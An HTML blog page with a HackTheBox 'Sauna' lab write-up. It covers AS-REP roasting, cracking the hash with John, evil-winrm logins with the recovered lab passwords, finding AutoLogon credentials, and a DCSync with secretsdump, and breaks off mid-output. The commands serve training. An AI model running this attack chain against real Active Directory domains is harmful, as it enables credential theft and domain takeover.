@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Sauna | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/07/htb-sauna.html" title="Read more" class="entry-title-link">
+                HTB: Sauna</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-07-22T09:35:00+02:00">22 Jul 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/windows.html" title="Read more with the label Windows" class="meta-link">Windows</a> 
+          <a href="../../tag/impacket.html" title="Read more with the label impacket" class="meta-link">impacket</a> 
+          <a href="../../tag/enumeration.html" title="Read more with the label enumeration" class="meta-link">enumeration</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 12 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.07/sauna_card.png" alt="Sauna card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/229">Sauna</a> published on
+February the 15th 2020 by
+<a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a>
+This box is classified as an easy machine. This box has a lot of similarities
+with <a href="https://maggick.fr/2020/03/htb-forest.html">forest</a>: The user part require some smart enumeration. The
+second user also require to enumerate the box and the root part is a "simple"
+exploitation of the second user's privileges.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>We start with an nmap scan. As always with the Windows boxes, a lot of services
+are exposed by the box.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Feb 17 08:29:26 2020 as: nmap -p- -sS -oN nmap_ss 10.10.10.175</span>
+<span class="code-line">Nmap scan report for 10.10.10.175</span>
+<span class="code-line">Host is up (0.27s latency).</span>
+<span class="code-line">Not shown: 65515 filtered ports</span>
+<span class="code-line">PORT      STATE SERVICE</span>
+<span class="code-line">53/tcp    open  domain</span>
+<span class="code-line">80/tcp    open  http</span>
+<span class="code-line">88/tcp    open  kerberos-sec</span>
+<span class="code-line">135/tcp   open  msrpc</span>
+<span class="code-line">139/tcp   open  netbios-ssn</span>
+<span class="code-line">389/tcp   open  ldap</span>
+<span class="code-line">445/tcp   open  microsoft-ds</span>
+<span class="code-line">464/tcp   open  kpasswd5</span>
+<span class="code-line">593/tcp   open  http-rpc-epmap</span>
+<span class="code-line">636/tcp   open  ldapssl</span>
+<span class="code-line">3268/tcp  open  globalcatLDAP</span>
+<span class="code-line">3269/tcp  open  globalcatLDAPssl</span>
+<span class="code-line">5985/tcp  open  wsman</span>
+<span class="code-line">9389/tcp  open  adws</span>
+<span class="code-line">49667/tcp open  unknown</span>
+<span class="code-line">49669/tcp open  unknown</span>
+<span class="code-line">49670/tcp open  unknown</span>
+<span class="code-line">49671/tcp open  unknown</span>
+<span class="code-line">49681/tcp open  unknown</span>
+<span class="code-line">57381/tcp open  unknown</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Mon Feb 17 08:43:53 2020 -- 1 IP address (1 host up) scanned in 867.44 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>We run a version scan on the open ports. There is a IIS web server on port 80:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Feb 17 08:45:29 2020 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49681,57381 -sSV -oN nmap_ssv 10.10.10.175</span>
+<span class="code-line">Nmap scan report for 10.10.10.175</span>
+<span class="code-line">Host is up (0.31s latency).</span>
+<span class="code-line"></span>
+<span class="code-line">PORT      STATE SERVICE       VERSION</span>
+<span class="code-line">53/tcp    open  domain?</span>
+<span class="code-line">80/tcp    open  http          Microsoft IIS httpd 10.0</span>
+<span class="code-line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-17 21:45:22Z)</span>
+<span class="code-line">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="code-line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span>
+<span class="code-line">445/tcp   open  microsoft-ds?</span>
+<span class="code-line">464/tcp   open  kpasswd5?</span>
+<span class="code-line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="code-line">636/tcp   open  tcpwrapped</span>
+<span class="code-line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span>
+<span class="code-line">3269/tcp  open  tcpwrapped</span>
+<span class="code-line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">9389/tcp  open  mc-nmf        .NET Message Framing</span>
+<span class="code-line">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">49669/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="code-line">49671/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">49681/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">57381/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="code-line">SF-Port53-TCP:V=7.80%I=7%D=2/17%Time=5E4A9906%P=x86_64-pc-linux-gnu%r(DNSV</span>
+<span class="code-line">SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
+<span class="code-line">SF:x04bind\0\0\x10\0\x03&quot;);</span>
+<span class="code-line">Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Mon Feb 17 08:48:06 2020 -- 1 IP address (1 host up) scanned in 156.46 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>The website is about the Egotistical Bank.</p>
+<p><img alt="Sauna website" src="/media/2020.07/sauna_01.png"></p>
+<p>The only "interesting" page is the "about" page where we can get a list of the
+"amazing" team.</p>
+<p><img alt="Sauna the &quot;amazing&quot; team" src="/media/2020.07/sauna_02.png"></p>
+<p>We get the teams members and put them in a file. We try to guess the name
+convention use by the company. For instance, for the employee John Doe we try
+"john.doe", "jdoe", "jodoe". This give use a list of possible users as the
+following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>fergus.smith</span>
+<span class="code-line">hugo.bear</span>
+<span class="code-line">steven.kerb</span>
+<span class="code-line">shaun.coins</span>
+<span class="code-line">bowie.taylor</span>
+<span class="code-line">sophie.driver</span>
+<span class="code-line">fsmith</span>
+<span class="code-line">hbear</span>
+<span class="code-line">skerb</span>
+<span class="code-line">scoins</span>
+<span class="code-line">btaylor</span>
+<span class="code-line">sdriver</span>
+<span class="code-line">fesmith</span>
+<span class="code-line">hubear</span>
+<span class="code-line">stkerb</span>
+<span class="code-line">shcoins</span>
+<span class="code-line">botaylor</span>
+<span class="code-line">sodriver</span>
+<span class="code-line"></code></pre></div>
+
+<p>We launch <a href="https://github.com/SecureAuthCorp/impacket/">impacket's</a> script
+<code>GetNPUsers.py</code> against our users list. We get the krb5tgs/Kerberoasting hash of the fsmith
+user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python GetNPUsers.py  -dc-ip 10.10.10.175  egotisticalbank/ -usersfile ~/pentest/htb_sauna/users</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">$krb5asrep$23$fsmith@EGOTISTICALBANK:7737b8e55d1ac7976a01e619a1268567$268f28ec59cfeda91a139f8f8c2c5cb9679d0dc04ba133f031b3021ebbd203888cd12633a0e604ad28420ff3fe41694d38f55b434bbe2af2b7ee0958a9a5705e4a880e2ecebb74a4d1aca73371cfcb73fb54a61520392d76079cc32bf3e128b87e3450d68361a84b4c686104e2fe13dc3cd7bd381a5ac87737ab8b95908bf0be409c7642fcfac3599aca04d19fd0f25f7bb4908a6fb496975f68ee3a4761ca406a43502b86410774127f25a5dc14c76dde7ac458df451dbcb093c4c6d069406e98c4839ecd6a0952a0850c289fab93e29682ec64cb690add83d0c6986c8f078bf25e53662f7d7fcc2c1e4740554036218a71320da2067a1298</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We crack that hash using John and the Rockyou dictionary getting fsmith
+password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>john hash -w=tools/password_lists/rockyou.txt</span>
+<span class="code-line">Warning: detected hash type &quot;krb5asrep&quot;, but the string is also recognized as &quot;krb5asrep-aes-opencl&quot;</span>
+<span class="code-line">Use the &quot;--format=krb5asrep-aes-opencl&quot; option to force loading these as that type instead</span>
+<span class="code-line">Using default input encoding: UTF-8</span>
+<span class="code-line">Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span>
+<span class="code-line">Will run 4 OpenMP threads</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICALBANK)</span>
+<span class="code-line">1g 0:00:00:19 DONE (2020-02-17 15:33) 0.05235g/s 551780p/s 551780c/s 551780C/s Thines..Thehulk2008</span>
+<span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
+<span class="code-line">Session completed</span>
+<span class="code-line"></code></pre></div>
+
+<p>We connect on the box with our fsmith account using
+<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>. And get the user flag
+on his desktop.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ruby evil-winrm.rb -u fsmith -i 10.10.10.175 -p &#39;Thestrokes23&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; cat ../Desktop/user.txt</span>
+<span class="code-line">1b5520b98d97cf17f24122a55baf70cf</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-root">Getting root</h1>
+<h2 id="getting-svc_loanmgr">Getting svc_loanmgr</h2>
+<p>We take a look at the other users on the box using <code>net user</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; net user</span>
+<span class="code-line"></span>
+<span class="code-line">User accounts for \\</span>
+<span class="code-line"></span>
+<span class="code-line">-------------------------------------------------------------------------------</span>
+<span class="code-line">Administrator            FSmith                   Guest</span>
+<span class="code-line">HSmith                   krbtgt                   svc_loanmgr</span>
+<span class="code-line">The command completed with one or more errors.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We upload
+<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">winPEAS.exe</a>
+from the Privilege Escalation Awesome Scripts SUITE and run it on the box.</p>
+<p>It found some AutoLogon credetials for the account <code>svc_loanmgr</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[+] Looking for AutoLogon credentials(T1012)</span>
+<span class="code-line">  Some AutoLogon credentials were found!!</span>
+<span class="code-line">      DefaultDomainName             :  EGOTISTICALBANK</span>
+<span class="code-line">      DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager</span>
+<span class="code-line">      DefaultPassword               :  Moneymakestheworldgoround!</span>
+<span class="code-line"></code></pre></div>
+
+<p>We connect on the box with the svc_loanmgr account using
+<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ruby evil-winrm.rb -u svc_loanmgr -i 10.10.10.175 -p &#39;Moneymakestheworldgoround!&#39;</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="enumerating-our-users-privileges">Enumerating our user's privileges</h2>
+<p>We run the <code>whoami /all</code> command to list our user permissions but there is
+nothing interesting here: As the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment">Microsoft documentation</a>
+point out all our privileges and group are legitimate.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; whoami /all</span>
+<span class="code-line"></span>
+<span class="code-line">USER INFORMATION</span>
+<span class="code-line">----------------</span>
+<span class="code-line"></span>
+<span class="code-line">User Name                   SID</span>
+<span class="code-line">=========================== ==============================================</span>
+<span class="code-line">egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">GROUP INFORMATION</span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">mGroup Name                                  Type             SID          Attributes</span>
+<span class="code-line">=========================================== ================ ============ ==================================================</span>
+<span class="code-line">Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">nNT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span>
+<span class="code-line">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">PRIVILEGES INFORMATION</span>
+<span class="code-line">----------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Privilege Name                Description                    State</span>
+<span class="code-line">============================= ============================== =======</span>
+<span class="code-line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
+<span class="code-line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
+<span class="code-line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">USER CLAIMS INFORMATION</span>
+<span class="code-line">-----------------------</span>
+<span class="code-line"></span>
+<span class="code-line">User claims unknown.</span>
+<span class="code-line"></span>
+<span class="code-line">Kerberos support for Dynamic Access Control on this device has been disabled.</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; WHOAMI /PRIV</span>
+<span class="code-line"></span>
+<span class="code-line">PRIVILEGES INFORMATION</span>
+<span class="code-line">----------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Privilege Name                Description                    State</span>
+<span class="code-line">============================= ============================== =======</span>
+<span class="code-line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
+<span class="code-line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
+<span class="code-line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="getting-ad-privileges">Getting AD privileges</h2>
+<p>We need to list our AD privileges.
+We upload <a href="https://github.com/sense-of-security/ADRecon">ADRecon</a> powershell
+script on the box, run it and download the results.</p>
+<p>(for more information about AD attacks: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">payloadallthethings</a>.)</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; upload /root/pentest/ADRecon.ps1 .\</span>
+<span class="code-line">Info: Uploading /root/pentest/ADRecon.ps1 to .\</span>
+<span class="code-line"></span>
+<span class="code-line">Data: 835464 bytes of 835464 bytes copied</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Upload successful!</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; .\ADRecon.ps1</span>
+<span class="code-line">[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)</span>
+<span class="code-line">Access denied</span>
+<span class="code-line">At C:\Users\svc_loanmgr\Documents\ADRecon.ps1:11249 char:25</span>
+<span class="code-line">+ ...           $computer = Get-CimInstance -ClassName Win32_ComputerSystem</span>
+<span class="code-line">+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="code-line">    + CategoryInfo          : PermissionDenied: (root\cimv2:Win32_ComputerSystem:String) [Get-CimInstance], CimException</span>
+<span class="code-line">    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand</span>
+<span class="code-line">Computer Role could not be identified.</span>
+<span class="code-line">Cannot find a variable with the name &#39;computerrole&#39;.</span>
+<span class="code-line">At C:\Users\svc_loanmgr\Documents\ADRecon.ps1:11292 char:5</span>
+<span class="code-line">+     Remove-Variable computerrole</span>
+<span class="code-line">+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="code-line">    + CategoryInfo          : ObjectNotFound: (computerrole:String) [Remove-Variable], ItemNotFoundException</span>
+<span class="code-line">    + FullyQualifiedErrorId : VariableNotFound,Microsoft.PowerShell.Commands.RemoveVariableCommand</span>
+<span class="code-line">[*] Running on \SAUNA -</span>
+<span class="code-line">[*] Commencing - 02/19/2020 15:41:03</span>
+<span class="code-line">[-] Domain</span>
+<span class="code-line">[-] Forest</span>
+<span class="code-line">[-] Trusts</span>
+<span class="code-line">[-] Sites</span>
+<span class="code-line">[-] Subnets</span>
+<span class="code-line">[-] Default Password Policy</span>
+<span class="code-line">[-] Fine Grained Password Policy - May need a Privileged Account</span>
+<span class="code-line">[-] Domain Controllers</span>
+<span class="code-line">[-] Users - May take some time</span>
+<span class="code-line">[-] User SPNs</span>
+<span class="code-line">[-] PasswordAttributes - Experimental</span>
+<span class="code-line">[-] Groups - May take some time</span>
+<span class="code-line">[-] Group Memberships - May take some time</span>
+<span class="code-line">[-] OrganizationalUnits (OUs)</span>
+<span class="code-line">[-] GPOs</span>
+<span class="code-line">[-] gPLinks - Scope of Management (SOM)</span>
+<span class="code-line">[-] DNS Zones and Records</span>
+<span class="code-line">[-] Printers</span>
+<span class="code-line">[-] Computers - May take some time</span>
+<span class="code-line">[-] Computer SPNs</span>
+<span class="code-line">[-] LAPS - Needs Privileged Account</span>
+<span class="code-line">Warning: [*] LAPS is not implemented.</span>
+<span class="code-line">[-] BitLocker Recovery Keys - Needs Privileged Account</span>
+<span class="code-line">[-] ACLs - May take some time</span>
+<span class="code-line">Warning: [*] SACLs - Currently, the module is only supported with LDAP.</span>
+<span class="code-line">[-] GPOReport - May take some time</span>
+<span class="code-line">[*] Total Execution Time (mins): 0.69</span>
+<span class="code-line">[*] Output Directory: C:\Users\svc_loanmgr\Documents\ADRecon-Report-20200219154103</span>
+<span class="code-line">Warning: [Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.xslx on a host with Microsoft Excel installed.</span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&gt; download ADRecon-Report-20200219154103 /tmp/adrecon</span>
+<span class="code-line">Info: Downloading ADRecon-Report-20200219154103 to /tmp/adrecon</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Download successful!</span>
+<span class="code-line"></code></pre></div>
+
+<p>We look at our user permissions and found that it has the AD privilege
+<a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes">DS-Replication-Get-Changes</a>
+which allows to replicate changes from a given NC.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>grep svc CSV-Files/*</span>
+<span class="code-line">CSV-Files/AboutADRecon.csv:&quot;Ran as user&quot;,&quot;svc_loanmgr&quot;</span>
+<span class="code-line">CSV-Files/DACLs.csv:&quot;EGOTISTICAL-BANK&quot;,&quot;Domain&quot;,&quot;All&quot;,&quot;All&quot;,&quot;ReadProperty, GenericExecute&quot;,&quot;Allow&quot;,&quot;EGOTISTICALBANK\svc_loanmgr&quot;,&quot;Administrators&quot;,&quot;False&quot;,&quot;None&quot;,&quot;None&quot;,&quot;None&quot;,&quot;None&quot;,&quot;00000000-0000-0000-0000-000000000000&quot;,&quot;00000000-0000-0000-0000-000000000000&quot;,&quot;EGOTISTICALBANK\svc_loanmgr&quot;,&quot;S-1-5-32-544&quot;,&quot;DC=EGOTISTICAL-BANK,DC=LOCAL&quot;</span>
+<span class="code-line">CSV-Files/DACLs.csv:&quot;EGOTISTICAL-BANK&quot;,&quot;Domain&quot;,&quot;DS-Replication-Get-Changes&quot;,&quot;All&quot;,&quot;ExtendedRight&quot;,&quot;Allow&quot;,&quot;EGOTISTICALBANK\svc_loanmgr&quot;,&quot;Administrators&quot;,&quot;False&quot;,&quot;ObjectAceTypePresent&quot;,&quot;None&quot;,&quot;None&quot;,&quot;None&quot;,&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;,&quot;00000000-0000-0000-0000-000000000000&quot;,&quot;EGOTISTICALBANK\svc_loanmgr&quot;,&quot;S-1-5-32-544&quot;,&quot;DC=EGOTISTICAL-BANK,DC=LOCAL&quot;</span>
+<span class="code-line">CSV-Files/DACLs.csv:&quot;EGOTISTICAL-BANK&quot;,&quot;Domain&quot;,&quot;DS-Replication-Get-Changes-All&quot;,&quot;All&quot;,&quot;ExtendedRight&quot;,&quot;Allow&quot;,&quot;EGOTISTICALBANK\svc_loanmgr&quot;,&quot;Administrators&quot;,&quot;False&quot;,&quot;ObjectAceTypePresent&quot;,&quot;None&quot;,&quot;None&quot;,&quot;None&quot;,&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;,&quot;00000000-0000-0000-0000-000000000000&quot;,&quot;EGOTISTICALBANK\svc_loanmgr&quot;,&quot;S-1-5-32-544&quot;,&quot;DC=EGOTISTICAL-BANK,DC=LOCAL&quot;</span>
+<span class="code-line">CSV-Files/GroupMembers.csv:&quot;Domain Users&quot;,&quot;svc_loanmgr&quot;,&quot;L Manager&quot;,&quot;user&quot;</span>
+<span class="code-line">CSV-Files/GroupMembers.csv:&quot;Remote Management Users&quot;,&quot;svc_loanmgr&quot;,&quot;L Manager&quot;,&quot;user&quot;</span>
+<span class="code-line">CSV-Files/Users.csv:&quot;svc_loanmgr&quot;,&quot;L Manager&quot;,&quot;True&quot;,&quot;False&quot;,&quot;False&quot;,&quot;True&quot;,&quot;False&quot;,&quot;False&quot;,&quot;True&quot;,&quot;False&quot;,,,,&quot;False&quot;,&quot;False&quot;,&quot;0&quot;,&quot;25&quot;,&quot;False&quot;,&quot;False&quot;,&quot;False&quot;,&quot;False&quot;,&quot;False&quot;,,,,,,&quot;513&quot;,&quot;S-1-5-21-2966785786-3096785034-1186376766-1108&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;2/19/2020 3:39:15 PM&quot;,&quot;1/24/2020 3:48:31 PM&quot;,,,&quot;&quot;,&quot;&quot;,,,,&quot;66048&quot;,&quot;L&quot;,&quot;&quot;,&quot;Manager&quot;,&quot;&quot;,&quot;1/24/2020 3:48:31 PM&quot;,&quot;2/19/2020 3:39:15 PM&quot;,&quot;CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL&quot;,&quot;EGOTISTICAL-BANK.LOCAL/Users/</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="dcsync">DCSync</h2>
+<p>This extended privilege allow us to <a href="https://adsecurity.org/?p=1729">run DCSync attack</a>.
+For that we use
+<a href="https://github.com/SecureAuthCorp/impacket/">impacket's secretdump.py</a> to get
+the users' passwords hashes and mostly the <code>administrator</code>'s password hash.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python secretsdump.py &#39;egotisticalbank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&#39;</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span>
+<span class="code-line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span>
+<span class="code-line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>
